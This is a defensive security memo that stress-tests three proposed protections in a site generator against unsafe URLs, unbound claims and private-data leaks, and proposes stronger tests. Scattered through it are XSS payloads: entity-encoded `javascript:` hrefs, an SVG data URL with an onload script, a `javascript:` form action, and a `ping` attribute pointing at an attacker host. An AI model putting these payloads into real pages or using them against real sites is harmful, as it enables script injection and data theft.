# FAIL-2 FALSIFICATION: adversarial attacks on the three survivors

**Date:** 2026-09-23. **Mode:** research only, no implementation code.
**Target:** the 3 surviving mechanisms in FAIL-2-unsafe-url.md, each claiming to prevent #2 unsafe-url, #5 claim-binding, #6 visibility-error.
**Method:** for each survivor, the strongest concrete attack I can construct, run in-head against the survivor's own stated falsifiable test. The question each time: does the test as written catch the attack? Where it does not, the test is strengthened.
**Grounding bar:** every attack is at least as realistic as FL-20260921-031 (a source-controlled string rendering verbatim into an executable sink through an ordinary field binding, `href={website}`).

## 0. Cross-cutting finding: the shared oracle weakness

All three falsifiable tests rely, explicitly or implicitly, on grepping rendered output for hostile substrings (`javascript:`, `data:text/html`, the private address string). This oracle is defeated by encoding, and the defeat is realistic, not theoretical:

- **HTML-entity smuggling.** Input `website: "&#106;avascript:alert(document.domain)"` (`&#106;` decodes to `j`). A parser-based constructor sees a raw string whose first character is `&`, which is not a valid scheme start, so the value classifies as schemeless/relative, not as a hostile scheme. If the serializer emits `&` unescaped into the href attribute, the browser's HTML parser decodes the entity *before* URL parsing, and the executed value is `javascript:alert(document.domain)`. The rendered bytes contain `&#106;avascript:`, so `grep javascript:` finds nothing. The test passes; the browser executes.
- Whether this *executes* depends on the serializer: React DOM rendering (`href={website}` setting the DOM property) never entity-decodes, so the attack is inert there; SSR string templating without `&`-escaping in attributes is vulnerable. The file does not specify which renderer FYD uses, and the tests cannot distinguish the two cases. That is itself a finding: the oracle cannot tell a safe serializer from a vulnerable one.
- Hex variant `&#x6A;avascript:alert(1)` and double-encoding variants behave the same way against a naive grep.

**Strengthened oracle (applies to all three survivors' tests):** do not grep raw bytes. HTML-entity-decode the serialized output, extract every URL-valued attribute, parse each per the WHATWG URL Standard (the same parser family the browser uses, e.g. Ada), and assert the resulting scheme is in the per-capability allowlist. For visibility assertions, percent-decode and whitespace-normalize before matching private strings. For claim assertions, a substring grep is insufficient against paraphrase; assert at the slot level (see Survivor 3, attack C4).

This oracle flaw alone means none of the three tests as written can support the claims made for them. Each per-survivor section below assumes the strengthened oracle unless noted, and still finds residual attacks.

---

## Survivor 1: Schema-typed trust with capability-specific allowlists

**Claim under test:** hostile strings cannot become URL-typed values because every constructor validates against a per-capability allowlist; the same typed-slot pattern extends to evidence-bound facts (#5) and visibility-classified fields (#6).

### Attack A1: constructor bypass at the deserialization boundary

Types exist only inside one runtime. The pipeline crosses serialization boundaries constantly: database reads, JSON fixtures, cache restores, hand-edited SiteSpecs, migration scripts. A typed value serialized to JSON becomes a string again, and on the way back in, *something* must call the validating constructor. In real codebases the hydration path is routinely an unchecked one: ORM materialization, `JSON.parse(...) as SiteSpec` casts, cache-restore fast paths, admin "force update" tools that write rows directly.

Concrete case: a poisoned row is written directly to the store (`website = "javascript:alert(1)"`, exactly the path Survivor 2's own test admits exists: "stale fixture, direct database write, corrupted pipeline output"). The read path hydrates it via a cast or an unchecked constructor for performance. The value is now typed `HrefUrl` without ever passing scheme validation. The render path, which trusts the type, emits it.

**Does Survivor 1's test catch this?** No. The test runs "proceduralize end to end" and attempts construction "at each binding site," but it never exercises the deserialization/hydration paths. The guarantee "cannot be constructed without validation" is only as strong as constructor discipline at *every* construction site, and the test audits none of them. In a TypeScript codebase (FYD renders `.tsx`), branded types are compile-time fiction: any `as HrefUrl` cast or deserialized cast erases the boundary silently.

### Attack A2: validated-string vs executed-string differential (entity smuggling)

Input `website: "&#106;avascript:alert(document.domain)"`. The constructor's parser sees no valid scheme (`&` cannot start a scheme) and the value is either rejected as unknown (safe) or accepted as a schemeless relative URL (the realistic outcome, since relative links like `/about` must remain legal). If accepted and the serializer does not escape `&` in attributes, the browser decodes the entity post-validation and executes. The constructor validated one string; the browser executed a different one. The type boundary validated the *pre-serialization* representation while the execution context consumed the *post-parse* representation.

**Does the test catch this?** No. The test's inputs (tab smuggling, `data:text/html`) are all caught by the constructor, and its grep oracle is blind to `&#106;`. Even with the strengthened oracle, this attack only dies if the constructor *also* rejects or neutralizes schemeless values containing `&`/`#`-entity patterns, or if the serializer is proven to escape `&`. Neither is in the stated mechanism.

### Attack A3: the PlainUrlString laundering type

The file names `PlainUrlString` as one of the schema types. A "plain URL string" type with no capability must have a constructor that is either permissive (then it is a laundering type: hostile string becomes typed, and any component that binds a `PlainUrlString` into an href slot, the exact FL-20260921-031 shape, reintroduces the failure) or restrictive (then it is unclear what it is for). The mechanism's #2 prevention therefore depends not on the constructors but on *renderer discipline*: no href sink may accept `PlainUrlString`. Survivor 1's test greps final HTML end to end, which would catch a laundering instance if the oracle were sound, but the test never enumerates which types each sink accepts. The type boundary is doing the advertised work only if the sink's accepted-type set is audited; it is not.

### Attack A4 (vs #5): misbound evidence passes the type gate

The #5 claim: "factual render slots accept only evidence-bound fact types." The constructor can check the *presence* of an evidence reference, not its *truth*. Concrete case: the claim "500+ happy customers served" carries an evidence pointer to a real but unrelated record (a Yelp page for a different business, a review about a different service). The type gate sees a well-formed evidence binding and admits it to the factual slot. The rendered page asserts an unsupported claim with a citation-shaped pointer next to it, which is worse than an unbound claim because it looks verified.

**Does the test catch this?** No. The test uses "a factual claim with no evidence reference." It never tests a claim with a *wrong* evidence reference. The mechanism prevents *unbound* claims; class #5 is about claims rendering without *valid* binding. The claim overreaches the mechanism.

### Attack A5 (vs #6): the authorized declassification path is the bypass

The #6 claim requires "an explicit, auditable declassification call" for private-to-public flows. That call is a legitimate, typed path from private to public. Concrete case: proceduralize (or an owner-override flow, cf. open question 5) invokes declassify on the home address for a viewer context that was misresolved (stale session, cached render reused across viewer contexts), or an owner action widens visibility and the "auditable" log is write-only and never reviewed (cf. open question 6: no neutralization telemetry exists). The type system records a call that nobody reads.

**Does the test catch this?** No. The test renders "a private-typed home address" directly in a public slot. It never exercises the declassification path, which is the only *authorized* route a private value takes to a public slot and therefore the route an attacker (or a bug) actually uses.

### Strengthened test for Survivor 1

1. Replace the grep oracle with the entity-decoding WHATWG-parse oracle from section 0.
2. Add `&#106;avascript:...` and `&#x6A;...` inputs; assert the constructor rejects or the serializer provably escapes `&` (assert on serializer behavior explicitly, not by accident).
3. Enumerate every construction/deserialization site (proceduralize binding sites *plus* DB hydration, cache restore, fixture loading, admin write paths); assert each one routes through the validating constructor. A single unchecked site falsifies the mechanism.
4. Add a misbound-evidence claim (valid-shaped pointer to an unrelated record); assert omission. This requires semantic binding validation, not just presence checks.
5. Exercise the declassification path: declassify a private fact for viewer context A, render for viewer context B (including via cache reuse); assert B never sees it, and assert the declassification event is recorded in a readable observation log.

### Verdict: WEAKENED

The constructor itself survives the direct smuggling attacks in its stated test, but the test cannot support the claims: the oracle is blind to entity smuggling, the deserialization paths are unaudited (and in a TS codebase the type boundary is erasable by cast), the #5 claim overreaches from "bound" to "validly bound," and the #6 claim's authorized bypass (declassification) is untested. With the strengthened test, Survivor 1 is a sound *layer*; as stated, its "prevents #2/#5/#6" claim is broader than its evidence.

---

## Survivor 2: Sink-side validation at the render seam

**Claim under test:** every sink re-derives trust from the value at render time, so poisoned upstream state (stale fixtures, direct DB writes) cannot reach execution; the same render-time enforcement covers claim binding (#5) and visibility (#6).

### Attack B1: the sink inventory is incomplete by the file's own admission

The mechanism's entire strength is the completeness of the sink inventory, and open question 3 lists the inventory as *unknown*: `srcset`, `formaction`, `xlink:href`, CSS `url()`, meta refresh are explicitly unconfirmed. The test poisons "a link slot" (singular) and invokes "the renderer." Unlisted sinks are unguarded sinks. Concrete live vectors:

- **iframe `src` + the `data:` exception.** Open question 1 floats a `SafeDataUrl` type (image/* MIME) for inline images. If the sink validator permits `data:image/svg+xml` anywhere and any embed/media component renders a URL field into an iframe `src`, then `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>` executes script in the iframe. SVG-as-image is inert; SVG-as-document is executable. A single validator shared across sinks with different capabilities turns the image exception into an execution vector. This breaks #2 *through* the validator: it ran, it approved, the value executed.
- **`formaction` / `action`.** A data-driven form action (`<form action="javascript:alert(document.domain)">`) executes on submit in modern browsers. If FYD renders quote/contact forms with configurable endpoints, this sink is live and unlisted.
- **SVG `xlink:href`.** Inline SVG `<a xlink:href="javascript:...">` executes on click. Logo/icon link fields that render inline SVG are a realistic carrier.
- **The `ping` attribute.** `<a ping="https://attacker.example/log">` exfiltrates click data cross-origin. Not script execution, but an unlisted URL sink with real impact.
- CSS `url()` and meta refresh are largely neutered as *execution* vectors in modern browsers (noted for completeness; CSS `url()` remains an exfiltration sink worth inventorying).

**Does the test catch this?** No. It poisons one link slot. A sink that was never inventoried is never poisoned, never validated, never tested.

### Attack B2: the second projection seam (Ask FYD)

Open question 7 asks whether the sink check runs on Ask FYD outputs and leaves it unanswered. Ask FYD answers questions from the graph at query time: a second projection seam with the same string-to-execution-context shape. If its link/markdown rendering is not wired through the sink validator, every #2, #5, and #6 guarantee restarts from zero on the conversational surface: a `javascript:` URL in a markdown link, an unbound claim asserted in an answer, a private fact repeated to the wrong viewer.

**Does the test catch this?** No. The test invokes "the renderer directly," i.e., the static site renderer. The conversational seam is out of scope of both the mechanism as tested and the test itself.

### Attack B3 (vs #6): derived-value leakage through an allowed URL

The visibility gate checks the *classification of the field*. Concrete case: the private home address never enters a public slot. Instead, a map-embed URL *derived* from it renders: `https://maps.google.com/?q=123%20Main%20St%2C%20Grand%20Junction%2C%20CO`. The field (map URL) is classified public, the scheme (https) is allowed, the gate passes it. The rendered HTML contains the private address, percent-encoded.

**Does the test catch this?** No, twice over. The gate is structurally blind to it (it validates scheme and field classification, not URL content), and the test's grep for "the private address string" is defeated by percent-encoding. The mechanism's threat model (slot misclassification) holds; derivation leakage is outside its model, and the test cannot see outside the model.

### Attack B4: capability must be sink-derived, never model-labeled

The mechanism says the sink "re-derives trust from the value itself" and "no stage inherits trust from a previous stage's say-so." That rule is violated if the *capability* (navigation vs embed vs image) is supplied by the model or the calling component rather than derived from the sink element. A poisoned model (or a confused component) that labels an attacker URL as capability=image while it renders into `<a href>` would pass an image-appropriate check at a navigation sink. The test's poisoned model puts the hostile value "directly in a link slot," so the slot determines the sink and this confusion is never exercised.

### Strengthened test for Survivor 2

1. Publish the sink inventory as an enumerated, versioned list (href, src, iframe-src, srcset, action, formaction, xlink:href, CSS url(), meta refresh, ping, tel:/mailto:, plus the Ask FYD output renderer). Poison *every* sink, not one link slot.
2. Per-sink capability allowlists: the `data:` image exception, if adopted, must be sink-scoped (img/srcset only), never shared with iframe-src or href. Assert `data:image/svg+xml` is rejected at iframe-src and href sinks.
3. Run the full poisoned-model suite against the Ask FYD output renderer independently. If it is unguarded, that is a finding, not a pass.
4. Add the encoded map-URL case; assert with the percent-decoding oracle. Add a derived-value rule: URL-valued fields derived from private facts inherit the private classification.
5. Assert capability is derived from the sink element, never from a model-supplied label; add a mislabeled-capability poison case.

### Verdict: WEAKENED

The static-seam, single-sink case the test exercises likely holds, but the "prevents #2/#5/#6" claim is a claim about *every* seam and *every* sink, and the test covers one sink on one seam while the file itself lists the inventory and the second seam as open questions. If the answer to open question 7 is "Ask FYD outputs are not sink-validated," this verdict upgrades to **FALLS on #2 and #5** (the classes reopen through the conversational surface). If the `data:` image exception is adopted without per-sink scoping, the iframe-src vector upgrades to **FALLS on #2** through the validator itself.

---

## Survivor 3: Fail-closed defaults at every seam crossing

**Claim under test:** whenever classification is unknown or indeterminate, the seam resolves to the weakest safe form (no executable link, coarse or omitted, unasserted), so novel attacker inputs are safe by construction.

### Attack C1: availability failure masquerading as safety (legitimate input, fail-closed fires)

Fail-closed has no availability bound in its statement, and the test uses only hostile/indeterminate inputs, so over-blocking is invisible to it. Concrete legitimate casualties:

- `tel:+1-970-555-0147;ext=203` (extension parameter; open question 2 leaves the tel: normalization spec open, so the constructor's idea of "normalized" is the entire risk surface for the site's highest-value CTA, click-to-call).
- `https://xn--mller-plumbing-...` / Unicode-IDN website for an immigrant-owned shop, if the parser does naive ASCII host checks.
- `mailto:office@shop.com?subject=Quote%20request` (legitimate pre-filled subject; open question 4 asks whether the validator strips or rejects parameters, and "rejects" silently degrades a working contact flow).

Each degrades silently: combined with open question 6 (no neutralization telemetry), nobody learns the phone number stopped being clickable. The second-order effect is the real falsification: silent breakage creates business pressure to add broad exceptions ("just allowlist the whole domain / skip validation for owner-entered values"), and *that* exception reopens #2. A safety mechanism that predictably generates the incentive to disable it is not a stable mechanism.

**Does the test catch this?** No. There is no legitimate-variety corpus in the test. The 17-case resolver suite is referenced for hostile inputs; nothing asserts the legitimate corpus still renders functionally.

### Attack C2: the classifier's known-good bucket is attacker-reachable

Fail-closed fires only on values the classifier labels *unknown*. The attack is to be labeled *known-good*. Revisit `&#106;avascript:alert(1)`: the parser finds no valid scheme (`&` cannot start one) and the value is not "unrecognized scheme," it is *misrecognized as a schemeless relative URL*, which is a positively allowed category (relative links are legitimate). The fail-closed default never fires because the value was never "unknown." The mechanism's "safe by construction for novel inputs" holds only within the classifier's competence, and the test's indeterminate inputs (`web+safe:`, empty string, whitespace-only) are all *obviously* unknown. The test never probes the boundary between known-good and unknown, which is the only place the default can be bypassed.

Further boundary probes the test omits: `https ://...` (space before colon), tab inside an otherwise-allowlisted scheme after trimming, `http&colon;//...` (entity inside a known-good scheme), scheme-relative `//evil.example/x` (schemeless but absolute, resolves against page scheme).

**Does the test catch this?** No. Every indeterminate input in the test is one the classifier was designed to reject. The test measures the classifier against its own training set.

### Attack C3 (vs #6): "coarse" is not "safe," and omission is a signal

The precedent default (precise address → "Grand Junction, CO") is re-identifiable: coarse location + business name + owner name resolves to one address via public records for most rural Western Slope shops. Fail-closed to coarse mitigates casual viewers, not motivated lookup. Separately, inconsistent omission leaks existence: a rendered "Service area:" with nothing after it, versus the line omitted entirely, tells an attacker a private fact exists and which field it is.

**Does the test catch this?** The test asserts "coarse form or not at all," which the mechanism satisfies. The claim "prevents #6" overreaches what coarse-and-silent achieves against a motivated viewer. WEAKENED-supporting, not a break.

### Attack C4 (vs #5): slot omission does not fail the containing sentence

The claim: a status-less claim "appears nowhere in factual slots." Concrete case: the revenue figure slot omits cleanly, but the sentence template "We serve [COUNT] happy customers" renders as "We serve  happy customers" (availability break), or worse, a downstream generator fills the gap with a plausible number (claim-binding failure through the back door: the *slot* was safe, the *sentence* was not). A paraphrased or generated version of the claim also evades the test's substring grep.

**Does the test catch this?** No. It greps for the claim string. Paraphrase and template-fill both evade it, and the test never asserts on the containing sentence.

### Attack C5: downstream re-arming of neutralized values

Fail-closed at seam N renders the hostile URL as plain text. A downstream stage re-executes it. Concrete case: the neutralized plain text `javascript:alert(1)` passes through a markdown/blog renderer with an auto-linker, which wraps it in `<a href="javascript:alert(1)">`. The classic double-processing bug: fail-closed at one seam becomes fail-open at the next. The test renders "the full pipeline output" once and greps; a pipeline whose later stages re-linkify would be caught only if the oracle is sound (see section 0) and only if the test asserts the invariant *after the last* text-processing stage, not just after the seam.

### Strengthened test for Survivor 3

1. Add a legitimate-variety corpus (IDN/punycode domains, tel: with `;ext=` and international formats, mailto: with query params, new gTLDs); assert every one renders in full functional form. Pair every fail-closed assertion with its availability twin.
2. Fuzz the known-good/unknown boundary: entity-encoded schemes, entities inside allowlisted schemes, scheme-relative URLs, whitespace variants the parser was not trained on. Assert fail-closed fires (or the value is provably inert post-serialization).
3. Assert neutralization events are emitted to a readable observation log (answers open question 6 and makes silent degradation detectable).
4. For #5: assert at the sentence level, not the slot level; a slot omission must cascade (sentence dropped or visibly incomplete, never silently filled).
5. Run the auto-linker / every downstream text stage over neutralized output; assert no stage re-creates an executable link (invariant checked after the *last* stage).

### Verdict: WEAKENED

The default direction (unknown → inert) is correct and the stated indeterminate inputs are handled, but the test only exercises inputs the classifier was built to reject, never the known-good boundary where bypasses live (C2); it has no availability bound, so silent over-blocking of legitimate contact paths is undetectable and creates pressure for the broad exceptions that would reopen #2 (C1); and the #5/#6 claims overreach (sentence-level fill, C4; re-identifiable coarse defaults, C3). With the strengthened test, Survivor 3 is a sound default rule; as stated, it is a correct instinct with an untested classifier and no availability half.

---

## Verdict summary

| Survivor | Verdict | Strongest attack the stated test misses | Upgrade condition to FALLS |
|---|---|---|---|
| 1. Schema-typed trust | WEAKENED | A1 deserialization bypass (unchecked hydration/casts make typed values without validation); A2 entity-smuggling defeats the grep oracle and the validated/executed string differential | If any production hydration path skips the constructor, #2 is open in production regardless of the test |
| 2. Sink-side validation | WEAKENED | B1 unlisted sinks (iframe-src + data: SVG, formaction, xlink:href); B2 Ask FYD second seam; B3 encoded derived-value leak (map URL) | If Ask FYD outputs are unvalidated (Q7 = no): FALLS on #2 and #5. If the data: image exception ships without per-sink scoping: FALLS on #2 through the validator itself |
| 3. Fail-closed defaults | WEAKENED | C2 known-good bucket stuffing (`&#106;...` misclassified as relative URL, default never fires); C1 silent over-blocking of legitimate tel:/IDN/mailto: with no telemetry | If exception pressure from C1 produces an owner-entered-value bypass: FALLS on #2 |

No survivor WITHSTANDS as stated, because in all three cases the falsifiable test is weaker than the claim: the shared grep oracle cannot see entity-encoded payloads (section 0), and each test omits the exact path its mechanism's guarantee depends on (deserialization sites for S1; the full sink inventory and second seam for S2; the known-good classifier boundary and availability corpus for S3).

## What would change the verdicts

- **S1 → WITHSTANDS:** strengthened test passes, including an audited construction-site inventory with zero unchecked paths, the entity oracle, misbound-evidence rejection, and viewer-context-scoped declassification with a readable audit log.
- **S2 → WITHSTANDS:** versioned sink inventory published and fully poison-tested, per-sink capability allowlists, Ask FYD renderer independently validated, derived-value classification rule in place.
- **S3 → WITHSTANDS:** boundary fuzzing passes, legitimate-variety corpus renders functionally, neutralization telemetry exists, sentence-level cascade asserted.
- Any survivor's verdict moves to FALLS on the named class if its upgrade condition above is confirmed.

## Bearing on the 7 open questions

- **Q1 (data: legitimate uses):** Attack B1 shows the `SafeDataUrl` exception is the single most dangerous open question in the file. If adopted, it must be sink-scoped (img/srcset only) with SVG excluded or sandboxed; a shared validator turns it into a #2 vector through iframe-src.
- **Q3 (sink inventory):** Load-bearing for Survivor 2's verdict. The inventory must be enumerated and versioned before the "prevents #2" claim is meaningful.
- **Q4 (mailto: parameter injection):** Fold into S3's legitimate-variety corpus (C1) and S1's TelUrl/MailtoUrl constructor spec. Newline/header injection must be rejected; benign params must survive.
- **Q5 (owner declassification path):** Load-bearing for Survivor 1's #6 claim (attack A5). Every declassification must be an observation with provenance, or "auditable" is decorative.
- **Q6 (neutralization telemetry):** Load-bearing for Survivor 3's stability (attack C1). Silent fail-closed generates the exception pressure that reopens #2. The reporting half is not optional.
- **Q7 (Ask FYD):** Load-bearing for Survivor 2's verdict and touches all three survivors' class claims. A second projection seam without sink validation reopens #2, #5, and #6 simultaneously. This is the highest-priority unanswered question in the file.
- **Q2 (tel: normalization):** Fold into S3's availability corpus (attack C1). The normalization spec is the boundary where legitimate contact links live or die.
